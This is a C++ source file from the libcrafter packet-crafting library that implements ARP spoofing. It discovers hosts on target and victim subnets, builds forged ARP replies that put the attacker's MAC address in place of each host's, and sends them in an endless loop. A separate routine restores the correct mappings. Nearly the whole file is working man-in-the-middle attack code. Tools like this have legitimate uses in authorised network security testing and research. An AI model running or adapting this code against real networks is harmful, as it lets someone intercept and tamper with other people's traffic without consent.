/*
Copyright (C) 2012 Pellegrino E.

This file is part of libcrafter

This is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/


#include "ARPSpoofing.h"
#include <signal.h>

using namespace std;
using namespace Crafter;

void* Crafter::ARPSpoofReply(void* thread_arg) {
	/* Get the ARP context */
	ARPContext* context = static_cast<ARPContext* >(thread_arg);

	/* Create generic headers */
	Ethernet ether_header;
	ether_header.SetSourceMAC(context->AttackerMAC);
	ARP arp_header;
	arp_header.SetOperation(ARP::Reply);
	arp_header.SetSenderMAC(context->AttackerMAC);

	/* Get size of both containers */
	size_t victim_size = context->VictimIPs->size();
	size_t target_size = context->TargetIPs->size();

	/* Poison target table */
	for(size_t i = 0 ; i < victim_size ; i++) {
		/* Set the sender IP address */
		arp_header.SetSenderIP( (*(context->VictimIPs))[i] );
		for(size_t j = 0 ; j < target_size ; j++) {
			ether_header.SetDestinationMAC( (*(context->TargetMACs))[j] );
			arp_header.SetTargetIP( (*context->TargetIPs)[j] );
			arp_header.SetTargetMAC( (*context->TargetMACs)[j] );

			/* Now, craft the packet */
			Packet* arp_packet = new Packet;

			arp_packet->PushLayer(ether_header);
			arp_packet->PushLayer(arp_header);

			context->arp_packets->push_back(arp_packet);
		}
	}

	/* Poison victim table */
	for(size_t i = 0 ; i < target_size ; i++) {
		/* Set the sender IP address */
		arp_header.SetSenderIP( (*context->TargetIPs)[i] );
		for(size_t j = 0 ; j < victim_size ; j++) {
			ether_header.SetDestinationMAC( (*context->VictimMACs)[j] );
			arp_header.SetTargetIP( (*context->VictimIPs)[j] );
			arp_header.SetTargetMAC( (*context->VictimMACs)[j] );

			/* Now, craft the packet */
			Packet* arp_packet = new Packet;

			arp_packet->PushLayer(ether_header);
			arp_packet->PushLayer(arp_header);

			context->arp_packets->push_back(arp_packet);
		}
	}


	while(1) {
		Send(context->arp_packets,context->iface,16);
		sleep(5);
	}

	/* Call pthread exit with a pointer to the new object */
	pthread_exit(NULL);
}

void Crafter::ARPNormalReply(void* thread_arg) {
	/* Get the ARP context */
	ARPContext* context = static_cast<ARPContext* >(thread_arg);

	/* Create generic headers */
	Ethernet ether_header;
	ARP arp_header;
	arp_header.SetOperation(ARP::Reply);

	/* Get size of both containers */
	size_t victim_size = context->VictimIPs->size();
	size_t target_size = context->TargetIPs->size();

	/* Poison target table */
	for(size_t i = 0 ; i < victim_size ; i++) {
		/* Set the sender IP address */
		ether_header.SetSourceMAC( (*context->VictimMACs)[i] );
		arp_header.SetSenderIP( (*context->VictimIPs)[i] );
		arp_header.SetSenderMAC( (*context->VictimMACs)[i] );

		for(size_t j = 0 ; j < target_size ; j++) {
			ether_header.SetDestinationMAC( (*context->TargetMACs)[j] );
			arp_header.SetTargetIP( (*context->TargetIPs)[j] );

			/* Now, craft the packet */
			Packet* arp_packet = new Packet;

			arp_packet->PushLayer(ether_header);
			arp_packet->PushLayer(arp_header);

			context->arp_packets->push_back(arp_packet);
		}
	}

	/* Poison victim table */
	for(size_t i = 0 ; i < target_size ; i++) {
		/* Set the target IP address */
		ether_header.SetSourceMAC( (*context->TargetMACs)[i] );
		arp_header.SetSenderIP( (*context->TargetIPs)[i] );
		arp_header.SetSenderMAC( (*context->TargetMACs)[i] );

		for(size_t j = 0 ; j < victim_size ; j++) {
			ether_header.SetDestinationMAC( (*context->VictimMACs)[j] );
			arp_header.SetTargetIP( (*context->VictimIPs)[j] );

			/* Now, craft the packet */
			Packet* arp_packet = new Packet;

			arp_packet->PushLayer(ether_header);
			arp_packet->PushLayer(arp_header);

			context->arp_packets->push_back(arp_packet);
		}
	}


	for(int i = 0 ; i < 3 ; i++) {
		Send(context->arp_packets,context->iface,16);
		sleep(2);
	}

}

ARPContext* Crafter::ARPSpoofingReply(const std::string& net_target, const std::string& net_victim, const string& iface) {

	/* Print header */
	cout << "[@] --- ARP Spoofer " << endl;

	/* Get attackers MAC addres */
	string MyMAC = GetMyMAC(iface);

	/* Print local MAC addres */
	cout << "[@] Attacker's MAC address = " << MyMAC << endl;

	/* Create generic headers */
	Ethernet ether_header;
	ether_header.SetDestinationMAC("ff:ff:ff:ff:ff:ff");
	ARP arp_header;
	arp_header.SetOperation(ARP::Request);

	/* ***************************** ARP ping -> Target net: */

	vector<string>* net = ParseIP(net_target);
	vector<string>::iterator it_IP;

	/* Create a new packet container */
	PacketContainer* arp_requests = new PacketContainer;

	for(it_IP = net->begin() ; it_IP != net->end() ; it_IP++) {
		/* Set Target IP */
		arp_header.SetTargetIP((*it_IP));

		Packet* arp_packet = new Packet;

		arp_packet->PushLayer(ether_header);
		arp_packet->PushLayer(arp_header);

		arp_requests->push_back(arp_packet);
	}

	/* Clear the string container */
	delete net;

	/* Send request and match replies */
	PacketContainer* arp_replies = SendRecv(arp_requests,iface,256,3,5);

	PacketContainer::iterator it_replies;

	/* Create container for MAC an IP addresses */
	vector<string>* TargetIPs = new vector<string>;
	vector<string>* TargetMACs = new vector<string>;

	for(it_replies = arp_replies->begin() ; it_replies != arp_replies->end() ; it_replies++) {
		if(*it_replies) {
			ARP* arp_reply = GetARP(*(*it_replies));
			if(arp_reply) {
				TargetIPs->push_back(arp_reply->GetSenderIP());
				TargetMACs->push_back(arp_reply->GetSenderMAC());
			}
			/* Finally, delete this packet */
			delete (*it_replies);
		}
	}

	/* Delete replies container */
	delete arp_replies;

	PacketContainer::iterator it_request;

	/* Delete request container */
	for(it_request = arp_requests->begin() ; it_request != arp_requests->end() ; it_request++)
		delete (*it_request);
	delete arp_requests;

	/* ***************************** ARP ping -> Victim net: */

	net = ParseIP(net_victim);

	arp_requests = new PacketContainer;

	for(it_IP = net->begin() ; it_IP != net->end() ; it_IP++) {
		/* Set Target IP */
		arp_header.SetTargetIP((*it_IP));

		Packet* arp_packet = new Packet;

		arp_packet->PushLayer(ether_header);
		arp_packet->PushLayer(arp_header);

		arp_requests->push_back(arp_packet);
	}

	/* Clear the string container */
	delete net;

	arp_replies = SendRecv(arp_requests,iface,256,3,5);

	/* Create container for MAC an IP addresses */
	vector<string>* VictimIPs = new vector<string>;
	vector<string>* VictimMACs = new vector<string>;

	for(it_replies = arp_replies->begin() ; it_replies != arp_replies->end() ; it_replies++) {
		if(*it_replies) {
			ARP* arp_reply = GetARP(*(*it_replies));
			if(arp_reply) {
				VictimIPs->push_back(arp_reply->GetSenderIP());
				VictimMACs->push_back(arp_reply->GetSenderMAC());
			}
			/* Finally, delete this packet */
			delete (*it_replies);
		}
	}

	/* Delete replies container */
	delete arp_replies;

	/* Delete request container */
	for(it_request = arp_requests->begin() ; it_request != arp_requests->end() ; it_request++)
		delete (*it_request);

	delete arp_requests;

	/* Create instance of ARP Spoofing Context */
	ARPContext* context = new ARPContext;

	/* Set the type of spoofing */
	context->type = ARPContext::Reply;

	context->AttackerMAC = MyMAC;

	context->iface = iface;

	context->TargetIPs = TargetIPs;
	context->TargetMACs = TargetMACs;

	context->VictimIPs = VictimIPs;
	context->VictimMACs = VictimMACs;

	void* thread_arg = static_cast<void *>(context);

	/* Create thread */
	pthread_t tid;

	/* Create a new packet container and put it into the context */
	PacketContainer* arp_request = new PacketContainer;

	context->arp_packets = arp_request;

	context->SanityCheck();

	int rc = pthread_create(&tid, NULL, ARPSpoofReply, thread_arg);

	if (rc) {
		PrintMessage(Crafter::PrintCodes::PrintError,
				     "ARPSpoofingReply()",
		             "Creating thread. Returning code = " + StrPort(rc));
		exit(1);
	}

	/* Put thread ID into the context */
	context->tid = tid;

	return context;
}
